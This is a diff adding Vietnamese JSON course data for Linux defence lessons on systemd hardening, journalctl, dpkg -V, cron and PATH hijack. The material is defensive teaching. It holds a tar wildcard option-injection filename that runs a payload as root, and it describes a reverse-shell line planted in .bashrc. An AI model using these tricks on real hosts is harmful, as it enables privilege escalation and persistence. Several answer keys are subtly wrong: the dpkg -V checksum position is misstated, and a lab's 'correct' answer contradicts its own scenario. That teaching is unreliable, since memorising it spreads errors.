+                "rationale": "Nhận diện đúng chuỗi 'privileged unit + writable ExecStart content'; kèm fix giữ chức năng deploy + verification — áp dụng checklist 60-giây đúng thứ tự."
+              },
+              {
+                "id": "C",
+                "label": "ExecStart dùng bash thay vì đường dẫn binary là lỗi cú pháp unit.",
+                "correct": false,
+                "rationale": "bash <script> là hợp lệ; vấn đề là AI (absolute interpreter OK) nhưng SCRIPT CONTENT writable bởi nhóm không root dưới unit root — trọng tâm khác."
+              },
+              {
+                "id": "D",
+                "label": "CapabilityBoundingSet= rỗng khiến app-api không chạy được.",
+                "correct": false,
+                "rationale": "Capset rỗng là hợp lệ và an toàn cho app không cần đặc quyền hạt nhân — đây là hardening đúng, không phải lỗi."
+              }
+            ]
+          },
+          {
+            "id": "sysd-case-02",
+            "title": "Journal window incident",
+            "context": "Incident: webshell hoạt động khoảng 02:10–02:40 hôm 05/06. Journal excerpt cho thấy nginx worker spawn 'sh' 02:12; app-api restart-loop 02:15–02:30 (crash mỗi 3s) spam hàng nghìn dòng; auth.log: sudo fail root 02:38 từ IP lạ.",
+            "prompt": "Truy vấn journalctl đúng để dựng timeline?",
+            "options": [
+              {
+                "id": "A",
+                "label": "journalctl (xem tất cả) rồi đọc tuần tự.",
+                "correct": false,
+                "rationale": "Restart-loop spam nuốt signal thật — đọc tuần tự hàng nghìn dòng restart là cách nhanh nhất bỏ sót sudo/exec events."
+              },
+              {
+                "id": "B",
+                "label": "Lọc có chủ đích: journalctl --since '02:10' --until '02:45' _COMM=sh (spawn lạ) ; -u app-api -p err (lý do crash thật, không spam info) ; ghép auth.log 02:38 (sudo brute sau exploit). Restart-loop cần chú thích: crash-loop là HIỆU ỨNG (payload crash?) chứ không phải cause — phân biệt cause/effect khi dựng timeline.",
+                "correct": true,
+                "rationale": "Dùng đúng filter unit/window/priority/comm để xuyên qua noise; hiểu restart-loop như effect-of-payload — tư duy timeline trưởng thành."
+              },
+              {
+                "id": "C",
+                "label": "Chỉ cần journalctl -u app-api — mọi thứ liên quan service này.",
+                "correct": false,
+                "rationale": "Spawn 'sh' thuộc nginx unit, sudo thuộc sshd/auth — incident xuyên unit; single-unit view tạo blind spot."
+              },
+              {
+                "id": "D",
+                "label": "Restart-loop 02:15 chứng minh attack bắt đầu 02:15.",
+                "correct": false,
+                "rationale": "Webshell hoạt động từ 02:12; loop bắt đầu sau đó — sequence cho thấy loop là consequence (payload chạm api?), không phải điểm khởi phát."
+              }
+            ]
+          },
+          {
+            "id": "sysd-case-03",
+            "title": "Hardening proposal",
+            "context": "Unit legacy: report-gen.service — User=root, ExecStart=/opt/reports/bin/gen (folder /opt/reports/bin owned reports-writers group, writable), reads templates /opt/reports/templates/, writes PDF /srv/reports/, needs no network, no special caps. Team sợ hardening vỡ app.",
+            "prompt": "Thiết kế hardening an toàn?",
+            "options": [
+              {
+                "id": "A",
+                "label": "Đổi tất cả directive strict nhất một lần, production test trực tiếp.",
+                "correct": false,
+                "rationale": "Big-bang trên legacy + prod-first là công thức outage; cần staged rollout có rollback."
+              },
+              {
+                "id": "B",
+                "label": "Staged drop-in: (1) User=reportgen (dedicated) + chown data dirs; (2) NoNewPrivileges=yes + CapabilityBoundingSet= (none needed); (3) ProtectSystem=strict + ReadWritePaths=/srv/reports /run/reportgen + PrivateTmp=yes; (4) fix folder bin: root-owned (writers chỉ templates dir). Test staging → systemd-analyze security → canary host → rollback = remove drop-in. Mỗi bước độc lập revert-able.",
+                "correct": true,
+                "rationale": "Áp đúng directive-per-risk mapping với migration an toàn (staging/canary/rollback) — cân bằng hardening và continuity đúng tinh thần lesson."
+              },
+              {
+                "id": "C",
+                "label": "Giữ root nhưng thêm ProtectSystem=strict là đủ.",
+                "correct": false,
+                "rationale": "User=root để nguyên nghĩa là RCE→root trong phạm vi whitelist ghi; identity layer phải siết trước filesystem sandbox."
+              },
+              {
+                "id": "D",
+                "label": "Bỏ hardening — legacy cứ để root cho ổn định.",
+                "correct": false,
+                "rationale": "'Legacy' là lý do CẦN hardening hơn (bug cũ, dependency cũ); rủi ro không giảm bằng việc né tránh."
+              }
+            ]
+          }
+        ],
+        "successCriteria": [
+          "Đọc merged unit (drop-in included) và đánh giá blast radius theo directive.",
+          "Nhận diện privileged-unit + writable-content privesc chain với fix giữ chức năng.",
+          "Xây journalctl query set xuyên-noise cho window incident đa-unit."
+        ],
+        "evidenceTemplate": [
+          "Unit review table: directive, value, risk, recommendation",
+          "Privesc chain: writable element → trigger → impact",
+          "Query set: command → purpose → expected output shape",
+          "Rollout plan: step, test gate, rollback action"
+        ],
+        "reset": "Đặt lại lựa chọn để review lại các unit từ đầu.",
+        "cleanup": "Bài tập mô phỏng logic an toàn trong trình duyệt, không chỉnh unit thật."
+      },
+      "governance": {
+        "prevent": [
+          "Policy: mọi service unit non-root + NoNewPrivileges + ProtectSystem theo template; CI check unit diff.",
+          "Unit/binary paths root-owned; deploy scripts không writable bởi runtime groups.",
+          "systemd-analyze security gate trong pipeline cho unit mới/sửa."
+        ],
+        "observe": [
+          "Monitor unit file changes (auditd watch /etc/systemd/system) + systemctl daemon-reload events.",
+          "Alert restart-loop pattern (restart frequency threshold) — noise lẫn signal đều cần thấy."
+        ],
+        "respond": [
+          "Service compromised: systemctl disable + mask (không chỉ stop), snapshot unit + binary, rotate credentials service dùng.",
+          "Unit tampering: restore từ package/git, diff drop-ins, truy vết account viết file (auditd)."
+        ],
+        "residualRisk": [
+          "Seccomp/SystemCallFilter sai có thể vỡ kernel-interface edge cases — cần soak testing.",
+          "Journal local vẫn có thể bị xóa bởi root — remote shipping là control bắt buộc cho forensics."
+        ]
+      },
+      "misconceptions": [
+        {
+          "claim": "systemctl stop là đủ để xử lý service bị chiếm.",
+          "correction": "Stop chỉ dừng instance hiện tại; enable + restart policy có thể hồi sinh. IR dùng disable + mask và xử lý binary/unit trước khi start lại."
+        },
+        {
+          "claim": "NoNewPrivileges chỉ là tùy chọn nhỏ không đáng bật.",
+          "correction": "NNP chặn nguyên lớp setuid/capability escalation cho toàn cây process service — một dòng chặn cả họ kỹ thuật leo thang phổ biến nhất Linux."
+        },
+        {
+          "claim": "ExecStart dùng tên tương đối tiết kiệm, không khác gì absolute.",
+          "correction": "Relative path resolve theo PATH của service env — PATH sai/hijack là chạy nhầm binary dưới identity unit; absolute path là baseline."
+        },
+        {
+          "claim": "Journal chỉ là syslog đổi tên.",
+          "correction": "Journal là store nhị phân có index (query unit/priority/field), gom cả stdout/stderr unit — capability query khác biệt căn bản so với grep text file."
+        }
+      ],
+      "quiz": [
+        {
+          "id": "os02-l17-q1",
+          "difficulty": "easy",
+          "question": "Directive nào đảm bảo service chạy bằng tài khoản không đặc quyền?",
+          "options": [
+            { "id": "A", "label": "ProtectSystem" },
+            { "id": "B", "label": "User=" },
+            { "id": "C", "label": "WantedBy" },
+            { "id": "D", "label": "Restart" }
+          ],
+          "correctAnswer": "B",
+          "explanation": "User=/Group= định nghĩa identity runtime; ProtectSystem là filesystem sandbox, WantedBy là boot target, Restart là lifecycle policy."
+        },
+        {
+          "id": "os02-l17-q2",
+          "difficulty": "medium",
+          "question": "NoNewPrivileges=yes chặn chính xác điều gì?",
+          "options": [
+            { "id": "A", "label": "Service không thể tạo process con" },
+            {
+              "id": "B",
+              "label": "Process và con của nó không thể nhận đặc quyền mới qua setuid/setcap/exec — escalation via SUID binary trở nên vô hiệu trong cây này"
+            },
+            { "id": "C", "label": "Service không đọc được /etc/passwd" },
+            { "id": "D", "label": "systemd không restart service nữa" }
+          ],
+          "correctAnswer": "B",
+          "explanation": "NNP đặt 'no new privileges' flag: mọi exec không được nâng đặc quyền — SUID bit trở nên vô dụng trong cây process đó."
+        },
+        {
+          "id": "os02-l17-q3",
+          "difficulty": "hard",
+          "question": "deploy.service (User=root) chạy /srv/deploy/run.sh; script owned dev-team writable. Vì sao đây là privesc hoàn chỉnh dù script KHÔNG phải SUID?",
+          "options": [
+            { "id": "A", "label": "Vì script writable luôn nguy hiểm bất kể ai chạy" },
+            {
+              "id": "B",
+              "label": "Vì unit ROOT thực thi nội dung script theo lịch/trigger: dev-team sửa script = chèn lệnh bất kỳ → lệnh chạy với identity root của unit lúc trigger — không cần SUID bit; writable-content-under-privileged-executor chính là công thức thay thế"
+            },
+            { "id": "C", "label": "Vì script .sh luôn chạy bằng root" },
+            { "id": "D", "label": "Vì systemd tự động chmod script" }
+          ],
+          "correctAnswer": "B",
+          "explanation": "Privilege đến từ EXECUTOR (unit), không từ bit trên file; ai kiểm soát nội dung được executor chạy thì kiểm soát privilege đó — cùng nguyên lý SUID nhưng qua unit scheduling."
+        }
+      ],
+      "transferChallenge": {
+        "scenario": "Bạn chuẩn hóa unit files cho 30 service nội bộ mô phỏng: mixed state (một nửa User=root legacy), yêu cầu security score ≤ 4 (thang systemd-analyze) cho tier internet-facing mà không vỡ SLA.",
+        "tasks": [
+          "Thiết kế template unit chuẩn (directive set tối thiểu) + ma trận exception khi service cần cap đặc biệt (vd bind 80).",
+          "Lên kế hoạch migration staged: đo score hiện tại → batch hardening → canary → fleet, kèm rollback per-batch.",
+          "Định nghĩa monitoring: unit-change alerts, restart-loop thresholds, journal retention/shipping requirements."
+        ],
+        "requiredEvidence": [
+          "Template unit + exception matrix",
+          "Migration plan với gates và rollbacks",
+          "Monitoring spec với ngưỡng cụ thể"
+        ]
+      },
+      "sources": [
+        {
+          "title": "systemd.exec — Execution environment configuration (directives reference)",
+          "url": "https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html",
+          "publisher": "freedesktop.org / systemd Project",
+          "sourceType": "official-documentation",
+          "accessedAt": "2026-08-25",
+          "supports": [
+            "Semantics User/NoNewPrivileges/ProtectSystem/CapabilityBoundingSet/PrivateTmp"
+          ]
+        },
+        {
+          "title": "journalctl(1) — Query the systemd journal",
+          "url": "https://www.freedesktop.org/software/systemd/man/latest/journalctl.html",
+          "publisher": "freedesktop.org / systemd Project",
+          "sourceType": "official-documentation",
+          "accessedAt": "2026-08-25",
+          "supports": [
+            "Filter options: -u, -p, --since/--until, field matching, output formats"
+          ]
+        },
+        {
+          "title": "systemd-analyze security — exposure level analysis",
+          "url": "https://www.freedesktop.org/software/systemd/man/latest/systemd-analyze.html",
+          "publisher": "freedesktop.org / systemd Project",
+          "sourceType": "official-documentation",
+          "accessedAt": "2026-08-25",
+          "supports": ["Automated unit sandbox scoring methodology"]
+        }
+      ]
+    },
+    {
+      "id": "os02-l18-packages-cron-and-shell-env",
+      "slug": "packages-cron-and-shell-env",
+      "title": "Package Integrity, Cron & Shell Environment",
+      "summary": "Xác minh tính toàn vẹn package (dpkg -V/rpm -Va); cơ chế cron và các biến thể persistence; PATH hijack và biến shell trong ngữ cảnh service/script; quy trình triage log auth cơ bản.",
+      "difficulty": "beginner",
+      "durationMinutes": 80,
+      "prerequisites": ["os02-l17-systemd-units-and-journal"],
+      "outcomes": [
+        "Sử dụng dpkg -V/rpm -Va để phát hiện file hệ thống bị sửa đổi và diễn giải output verification.",
+        "Giải thích cơ chế cron (spool dirs, /etc/cron.*, PATH đặc biệt) và nhận diện scheduled-task persistence/misconfig.",
+        "Phân tích PATH resolution risk trong script/service context và thiết kế mitigation (absolute paths, secure PATH).",
+        "Đọc /var/log/auth.log (hoặc journal equivalent) để dựng timeline đăng nhập/sudo cơ bản phục vụ triage."
+      ],
+      "careerPaths": ["penetration-test", "red-team", "vulnerability-research"],
+      "domains": ["linux"],
+      "attackTactics": ["TA0003", "TA0004"],
+      "keywords": [
+        "package-integrity",
+        "cron",
+        "path-hijack",
+        "auth-log",
+        "persistence-audit"
+      ],
+      "safetyLevel": "safe",
+      "mentalModel": "Ba lớp nền vận hành cần 'biết là tay ai': PACKAGE (binary từ đâu, còn nguyên vẹn không — dpkg/rpm giữ manifest hash để đối chiếu), LỊCH (việc gì tự chạy khi nào — cron là persistence yêu thích vì 'chạy âm thầm định kỳ'), và MÔI TRƯỜNG SHELL (PATH quyết định 'ls' của bạn thực ra là file nào — resolve theo thứ tự thư mục, thư mục đầu thắng). Ba lớp này ghép thành bộ ba câu hỏi audit: file hệ thống có bị thay không, việc định kỳ nào đang chạy, binary nào được resolve từ đâu. Trả lời được cả ba là nắm được phần lớn persistence và hijack surface của một host Linux.",
+      "visual": {
+        "title": "Ba Lớp Nền: Package, Lịch, PATH",
+        "caption": "Manifest hash đối chiếu file; cron spool liệt kê việc tự chạy; PATH resolve left-to-right.",
+        "steps": [
+          {
+            "label": "Package manifest",
+            "detail": "dpkg -V so hash file cài đặt với manifest: '5' = md5 mismatch, 'U' = ownership changed — drift ngoài update là finding.",
+            "tone": "caution"
+          },
+          {
+            "label": "Cron spools",
+            "detail": "/var/spool/cron/crontabs (per-user) + /etc/cron.d|daily|hourly — audit phải phủ CẢ HAI; wildcard trong cron script là classic privesc.",
+            "tone": "stop"
+          },
+          {
+            "label": "PATH resolve",
+            "detail": "echo $PATH: thứ tự thư mục; thư mục writable đứng TRƯỚC /usr/bin = 'ls' có thể là binary của attacker.",
+            "tone": "stop"
+          },
+          {
+            "label": "Shell rc files",
+            "detail": ".bashrc/.profile chạy mỗi login — persistence sạch sẽ cho attacker; diff với package default là audit step.",
+            "tone": "caution"
+          },
+          {
+            "label": "Auth timeline",
+            "detail": "auth.log: Accepted/Failed password, sudo commands, new user — ba mảnh ghép timeline xâm nhập ban đầu.",
+            "tone": "neutral"
+          }
+        ]
+      },
+      "sections": [
+        {
+          "title": "Package Integrity: Manifest Là Chân Ái",
+          "paragraphs": [
+            "Package manager ghi manifest (file list + hash + mode + owner) lúc cài. Debian: dpkg -V <pkg> hoặc debsums; RPM: rpm -Va. Output 9 ký tự mỗi file: vị trí 1-5 là MD5SUM ('5'=sai hash), size, link, time; 'c' prefix = config file (thay đổi config là bình thường). File binary hệ thống sai hash mà không qua update = cảnh báo compromise (rootkit userland thay ps/ls/netstat era cổ điển, giờ vẫn gặp trên IoT/legacy).",
+            "Giới hạn phải trung thực: manifest chỉ bảo vệ file PACKAGE quản — file tự thêm (không thuộc package nào) vô hình với dpkg -V; attacker có root có thể cập nhật cả database manifest (anti-forensics nâng cao). Do đó integrity checking nghiêm túc dùng AIDE/tripwire với database offline-signed, hoặc immutable infrastructure (rebuild image thay vì patch-in-place)."
+          ],
+          "points": [
+            "rpm -Va full-system quét chậm nhưng đáng chạy định kỳ trên server ít churn.",
+            "Kiểm 'orphan files': file executable trong /usr/local/bin không thuộc package nào — nguồn persistence phổ biến.",
+            "debsums -c chỉ báo file corrupted (bỏ config) — quick win cho triage."
+          ]
+        },
+        {
+          "title": "Cron: Lịch Việc và Bẫy Wildcard",
+          "paragraphs": [
+            "Nơi lưu: per-user spool (/var/spool/cron/crontabs/<user>, chỉnh bằng crontab -e), hệ thống /etc/crontab + /etc/cron.d/* (có field user) + /etc/cron.{hourly,daily,weekly,monthly}/ (script thuần). Cú pháp: minute hour dom month dow command. Cron chạy với env tối giản: PATH mặc định thường /usr/bin:/bin (cũ hơn) — script gọi binary không absolute phụ thuộc PATH này.",
+            "Wildcard privesc kinh điển: cron root chạy 'tar czf backup.tgz *' trong folder writable → attacker tạo file '--checkpoint-action=exec=...' để tar thực thi lệnh với quyền root. Nguyên tắc chung: cron root + wildcard expansion + writable working dir = privesc. Audit: liệt kê mọi cron entry, với mỗi entry hỏi ba câu — chạy as ai, thao tác trên folder nào, có wildcard/exec dynamic không."
+          ],
+          "points": [
+            "anacron cho máy không chạy 24/7 — kiểm song song trên laptop/workstation.",
+            "systemd timer đang thay cron dần — audit CẢ HAI (lesson trước đã có timer).",
+            "Cron mail output tới user — mailbox đầy là indicator job chạy sai từ lâu."
+          ]
+        },
+        {
+          "title": "PATH Hijack và Shell Environment",
+          "paragraphs": [
+            "Khi gõ 'ls', shell duyệt PATH trái→phải, chạy file executable đầu tiên match. Nếu PATH chứa '.' hoặc folder writable trước /usr/bin — 'ls' của admin có thể là binary khác. Trong service context: cron PATH tối giản, systemd unit PATH mặc định hạn chế — script gọi 'python' không absolute có thể resolve khác giữa interactive-shell và cron-context (bug 'chạy tay thì ok, cron thì fail' kinh điển — và cũng là hijack point).",
+            "Shell rc (.bashrc/.profile/etc/profile.d) thực thi mỗi login — persistence sạch: một dòng curl-reverse-shell trong .bashrc của admin kích hoạt mỗi lần đăng nhập. Mitigation: package-managed dotfiles, diff định kỳ, cấm PATH chứa '.' (nếu cần thì './tool' tường minh), script production dùng PATH hardcoded đầu script."
+          ],
+          "points": [
+            "type -a ls in TẤT CẢ vị trí ls được resolve — audit PATH nhanh nhất.",
+            "secure_path trong sudoers chuẩn hóa PATH cho sudo commands — chống hijack qua user PATH.",
+            "env -i chạy process với env trống — cách test script 'clean-room' xem phụ thuộc env gì."
+          ]
+        },
+        {
+          "title": "Auth Log Triage 101",
+          "paragraphs": [
+            "auth.log (Debian: /var/log/auth.log; RHEL: /var/log/secure hoặc qua journal) chứa: sshd Accepted/Failed/Invalid user, sudo: command runs, su, useradd/usermod, CRON session open/close. Timeline xâm nhập điển hình: Failed password burst → Accepted (password spray thành công) → sudo commands lạ → useradd backdoor → cron/unit persistence.",
+            "Quick queries: grep 'Accepted' auth.log (đăng nhập thành công — đối chiếu IP/user hợp lệ); grep sudo (ai lên quyền chạy gì); grep 'new user' (account creation). Volume cao → journalctl _COMM=sshd --since. Nhớ: log local có thể bị attacker xóa — shipping out-of-band là tiền đề của mọi triage nghiêm túc (nhất quán với lesson trước)."
+          ],
+          "points": [
+            "last/lastlog đọc wtmp — đăng nhập gần nhất theo tty/host.",
+            "Failed-password spike từ MỘT IP = spray; từ NHIỀU IP = botnet distributed — response khác nhau.",
+            "Session mở không khớp login record = nghi session hijack — correlate ss -tnp với auth timeline."
+          ]
+        }
+      ],
+      "lab": {
+        "title": "Integrity Desk — Package, Cron & PATH Audit",
+        "objective": "Diễn giải output dpkg -V, audit cron entries tìm privesc wildcard, và trace PATH resolution trong kịch bản script-vs-cron.",
+        "scenario": "Bạn audit server legacy Linux mô phỏng: output dpkg -V excerpt, nội dung /etc/crontab + spool user root, một backup script, và PATH config của cron vs interactive. Toàn bộ tĩnh trong trình duyệt.",
+        "constraints": [
+          "Chỉ suy luận từ dữ liệu cấp; không chạy verify/cron thật.",
+          "Verdict package phải decode đúng ký tự verification output.",
+          "Cron finding phải chỉ ra user/wildcard/dir-writability triple."
+        ],
+        "cases": [
+          {
+            "id": "pkg-case-01",
+            "title": "dpkg -V output",
+            "context": "?5??????c /etc/app/app.conf | ??5?????  /bin/ps | ??5?????  /usr/bin/python3.11 | ?????T?? /usr/local/bin/dbtool (không thuộc package nào — orphan)",
+            "prompt": "Diễn giải và xếp ưu tiên?",
+            "options": [
+              {
+                "id": "A",
+                "label": "app.conf sai hash là P1 — restore ngay.",
+                "correct": false,
+                "rationale": "'c' = config file — thay đổi config là hoạt động bình thường; binary hệ thống sai hash mới là alarm."
+              },
+              {
+                "id": "B",
+                "label": "P1: /bin/ps + python3 sai MD5 (binary hệ thống modified — nghi rootkit userland/tamper; so sánh hash từ package mirror sạch, isolate nếu confirm). P2: dbtool là orphan executable (persistence candidate — inspect origin/owner/hash). Config file 'c' là normal. Verify: tải package sạch, sha256 so sánh, không tin hash trên host bị nghi.",
+                "correct": true,
+                "rationale": "Decode đúng verification flags, phân loại config-vs-binary, nhận diện orphan; và biết lấy reference hash NGOÀI host nghi nhiễm — kỷ luật forensics đúng."
+              },
+              {
+                "id": "C",
+                "label": "python3 sai hash chỉ là do update chưa ghi manifest.",
+                "correct": false,
+                "rationale": "Update qua apt/dnf cập nhật manifest cùng lúc; sai hash sau update-normal là hiếm — phải verify bằng nguồn ngoài trước khi chấp nhận giải thích tiện lợi."
+              },
+              {
+                "id": "D",
+                "label": "Orphan file vô hại vì không thuộc package nào.",
+                "correct": false,
+                "rationale": "Không thuộc package = không ai quản lý update/integrity — chính xác LÝ DO nó là nơi persistence ưa thích."
+              }
+            ]
+          },
+          {
+            "id": "pkg-case-02",
+            "title": "Cron wildcard privesc",
+            "context": "/etc/crontab: '0 2 * * * root cd /srv/backups && tar czf site-$(date +\\%F).tgz *'. /srv/backups: drwxrwxrwx (world-writable). Spool root thêm: '*/30 * * * * rsync -a /var/www/ /mnt/nas/'. Attacker account có thể ghi /srv/backups.",
+            "prompt": "Phân tích và remediation?",
+            "options": [
+              {
+                "id": "A",
+                "label": "Không có vấn đề — backup hàng ngày là practice tốt.",
+                "correct": false,
+                "rationale": "Practice tốt bị thực thi sai: wildcard + world-writable cwd dưới cron root là privesc textbook."
+              },
+              {
+                "id": "B",
+                "label": "P1: tar * trong /srv/backups world-writable → attacker tạo file tên '--checkpoint-action=exec=/tmp/payload' — tar expand thành option và chạy payload AS ROOT lúc 02:00. Fix: (1) chmod 750 /srv/backups owner root; (2) tar dùng --exclude hoặc liệt kê file tường minh thay vì *; (3) audit tương tự mọi cron wildcard. rsync spool ổn nếu /mnt/nas mount an toàn. Verify: simulate filename-option trick trong lab phải không còn execute.",
+                "correct": true,
+                "rationale": "Hiểu cơ chế argument-expansion attack trọn vẹn (option-like filenames) + remediation cả permission lẫn code pattern + verification."
+              },
+              {
+                "id": "C",
+                "label": "Chỉ cần chuyển cron sang user thường là hết rủi ro.",
+                "correct": false,
+                "rationale": "Hạ user giảm impact nhưng vẫn là arbitrary-code-exec-as-user-that-writable; và backup cần quyền đọc rộng — fix gốc vẫn là permission + no-wildcard."
+              },
+              {
+                "id": "D",
+                "label": "date +%F trong command là lỗ hổng command injection.",
+                "correct": false,
+                "rationale": "$(date +%F) trong crontab là static system-controlled — không input attacker; wildcard mới là vấn đề."
+              }
+            ]
+          },
+          {
+            "id": "pkg-case-03",
+            "title": "Script chạy tay OK, cron fail",
+            "context": "Script /opt/jobs/export.sh: 'python3 export.py' (không absolute). Interactive shell của admin: PATH=/usr/local/bin:/usr/bin:/bin — python3 ở /usr/bin. Cron PATH mặc định: /usr/bin:/bin. Nhưng server có /usr/local/bin/python3 (version khác, do dev cài, thiếu module export). Admin báo: 'chạy tay OK, cron báo ImportError'.",
+            "prompt": "Root cause và fix đúng?",
+            "options": [
+              {
+                "id": "A",
+                "label": "Module bị thiếu — pip install vào cron environment.",
+                "correct": false,
+                "rationale": "Không phải thiếu module — là CHẠY NHẦM interpreter; install thêm module vào nhầm interpreter làm hệ thống bẩn thêm."
+              },
+              {
+                "id": "B",
+                "label": "Root cause: PATH resolution khác context — interactive resolve python3 → /usr/local/bin (đầu PATH) nhưng... ngược lại cron PATH /usr/bin trước nên cron dùng /usr/bin/python3 (thiếu module dev cần), tay dùng /usr/local/bin (có module). Fix chuẩn: script pin absolute /usr/local/bin/python3 (hoặc venv path) + set PATH explicit đầu script; secondary: document/remove duplicate interpreters. Đây vừa là stability fix vừa là hijack-surface reduction.",
+                "correct": true,
+                "rationale": "Truy đúng cơ chế resolve theo thứ tự từng context; fix tường minh (absolute interpreter) giải quyết đồng thời reliability + security — đúng tinh thần mental-model PATH."
+              },
+              {
+                "id": "C",
+                "label": "Thêm module vào /usr/bin/python3 để cron chạy được.",
+                "correct": false,
+                "rationale": "Patch triệu chứng trên system interpreter — version drift tiếp tục gây nhiễu; và system python bị bẩn module ad-hoc là anti-pattern."
+              },
+              {
+                "id": "D",
+                "label": "Chạy cron bằng bash -l để load profile giống interactive.",
+                "correct": false,
+                "rationale": "Login-shell emulation trong cron làm cron phụ thuộc dotfiles (rộng hijack surface) — hướng NGƯỢC với hardening; tường minh hóa mới là đúng."
+              }
+            ]
+          }
+        ],
+        "successCriteria": [
+          "Decode dpkg -V flags và phân loại severity config/binary/orphan đúng.",
+          "Nhận diện wildcard-privesc triple (privileged cron + wildcard + writable dir) kèm fix kép.",
+          "Giải thích PATH resolution khác biệt giữa contexts và pin-down fix tường minh."
+        ],
+        "evidenceTemplate": [
+          "Verification decode table: ký tự → ý nghĩa → verdict",
+          "Cron audit matrix: entry, user, cwd/dir perms, wildcard?, verdict",
+          "PATH resolution trace: context → order → resolved binary",
+          "Fix list: permission + code-pattern + verification"
+        ],
+        "reset": "Đặt lại lựa chọn để audit lại từ đầu.",
+        "cleanup": "Bài tập mô phỏng logic an toàn trong trình duyệt, không chạy verify/cron thật."
+      },
+      "governance": {
+        "prevent": [
+          "Integrity monitoring (AIDE offline db) cho /bin,/sbin,/usr/bin; alert orphan executables.",
+          "Cron policy: cấm wildcard trên privileged cron; folders của privileged jobs root-only; systemd timer preferred.",
+          "Scripts production pin absolute interpreter + explicit PATH; cấm '.' trong PATH mọi account."
+        ],
+        "observe": [
+          "Diff crontab/spool/timer snapshots định kỳ — persistence audit là routine.",
+          "Auth log analytics: failed-spike per-source, sudo anomaly, new-user events."
+        ],
+        "respond": [
+          "Binary mismatch confirmed: isolate, so hash với mirror sạch, rebuild từ image tin cậy thay vì 'repair in place'.",
+          "Persistence found (rc/cron/orphan): remove + hunt cùng-pattern toàn fleet + rotate credentials trên host."
+        ],
+        "residualRisk": [
+          "Attacker root có thể refresh cả manifest/database — offline-signed integrity db là minimum cho high-assurance.",
+          "Legacy hosts không thể AIDE ngay — compensating: remote log shipping + periodic rebuild."
+        ]
+      },
+      "misconceptions": [
+        {
+          "claim": "dpkg -V sạch nghĩa là host sạch.",
+          "correction": "Manifest chỉ phủ file package quản; file tự thêm (orphan), cron/rc persistence, và database-tampering đều ngoài tầm — cần audit lớp khác song song."
+        },
+        {
+          "claim": "Wildcard trong cron chỉ là style coding.",
+          "correction": "Với privileged cron + writable cwd, wildcard là cơ chế chèn option/tùy chọn vào tool (tar/rsync/find) — privesc deterministic, không phải aesthetic issue."
+        },
+        {
+          "claim": "PATH chỉ quan trọng khi attacker có shell.",
+          "correction": "PATH sai thứ tự gây mis-resolution NGAY trong vận hành thường (chạy nhầm interpreter/version) — vừa reliability bug vừa hijack surface; hai mặt cùng một cơ chế."
+        },
+        {
+          "claim": "Config file sai hash trong dpkg -V là dấu hiệu hack.",
+          "correction": "Config ('c') thay đổi là bình thường theo thiết kế; binary/library sai hash mới là alarm — decode flags trước khi panic."
+        }
+      ],
+      "quiz": [
+        {
+          "id": "os02-l18-q1",
+          "difficulty": "easy",
+          "question": "Ký tự nào ở vị trí đầu trong dòng dpkg -V cho biết file sai MD5?",
+          "options": [
+            { "id": "A", "label": "'5'" },
+            { "id": "B", "label": "'X'" },
+            { "id": "C", "label": "'!'" },
+            { "id": "D", "label": "'M'" }
+          ],
+          "correctAnswer": "A",
+          "explanation": "'5' ở checksum position = MD5 mismatch; 'c' prefix nghĩa config file (normal to change)."
+        },
+        {
+          "id": "os02-l18-q2",
+          "difficulty": "medium",
+          "question": "Ba yếu tố tạo nên wildcard-privesc trong cron?",
+          "options": [
+            {
+              "id": "A",
+              "label": "Cron chạy root + command dùng wildcard + working directory writable bởi attacker"
+            },
+            { "id": "B", "label": "Cron chạy thường + wildcard + PATH dài" },
+            { "id": "C", "label": "File crontab lớn + comment nhiều + user nhiều" },
+            { "id": "D", "label": "Wildcards chỉ nguy hiểm với rsync" }
+          ],
+          "correctAnswer": "A",
+          "explanation": "Wildcard expand filenames thành arguments — file tên '--checkpoint-action=...' trở thành OPTION của tool chạy root; cần cwd writable để attacker 'gieo' filename."
+        },
+        {
+          "id": "os02-l18-q3",
+          "difficulty": "hard",
+          "question": "Vì sao fix 'bash -l trong cron để giống môi trường interactive' đi NGƯỢC hướng hardening?",
+          "options": [
+            { "id": "A", "label": "Vì bash -l chậm hơn" },
+            {
+              "id": "B",
+              "label": "Vì nó kéo toàn bộ dotfiles/profile (PATH, alias, function) vào cron context — tăng phụ thuộc vào file user-controllable và mở hijack surface; hướng đúng là TUYÊN MINH hóa (absolute paths, PATH explicit) thay vì mô phỏng môi trường mơ hồ"
+            },
+            { "id": "C", "label": "Vì cron không hỗ trợ bash -l" },
+            { "id": "D", "label": "Vì profile sẽ reset permissions" }
+          ],
+          "correctAnswer": "B",
+          "explanation": "Determinism là bạn của security: cron env tối giản CỐ Ý; làm nó 'giống interactive' qua login-shell vừa unreliable vừa rộng mặt trận — explicit beats implicit."
+        }
+      ],
+      "transferChallenge": {
+        "scenario": "Bạn xây 'host integrity baseline' cho 50 server Linux mô phỏng chia 3 tier (edge-web, internal-app, db). Yêu cầu: phát hiện binary tamper, persistence mới (cron/timer/rc/orphan), và PATH-related drift trong vòng 24h với ít false-positive nhất.",
+        "tasks": [
+          "Thiết kế matrix integrity checks per-tier: tool (AIDE/dpkg -V), scope, schedule, offline-db strategy.",
+          "Viết persistence-audit runbook: nguồn liệt kê (spool/cron.d/timer/rc/orphan), diff baseline, verdict flow.",
+          "Đề xuất standard script header (PATH pinning + absolute interpreter) và CI check để enforce cho repo scripts nội bộ."
+        ],
+        "requiredEvidence": [
+          "Tier matrix: check, scope, frequency, storage",
+          "Runbook với decision points",
+          "Script header standard + CI rule pseudo-code"
+        ]
+      },
+      "sources": [
+        {
+          "title": "Debian FAQ / dpkg manual — package verification (dpkg -V)",
+          "url": "https://manpages.debian.org/testing/dpkg/dpkg.1.en.html",
+          "publisher": "Debian Project",
+          "sourceType": "official-documentation",
+          "accessedAt": "2026-08-25",
+          "supports": ["dpkg -V verification output format và semantics"]
+        },
+        {
+          "title": "POSIX / Linux man-pages — crontab(5) và cron(8) behavior",
+          "url": "https://man7.org/linux/man-pages/man5/crontab.5.html",
+          "publisher": "Linux Kernel Organization / cron maintainers",
+          "sourceType": "official-documentation",
+          "accessedAt": "2026-08-25",
+          "supports": [
+            "Cú pháp crontab, spool locations, environment handling của cron daemon"
+          ]
+        },
+        {
+          "title": "bash manual — Command Search and Execution (PATH resolution)",
+          "url": "https://www.gnu.org/software/bash/manual/html_node/Command-Search-and-Execution.html",
+          "publisher": "GNU Project",
+          "sourceType": "official-documentation",
+          "accessedAt": "2026-08-25",
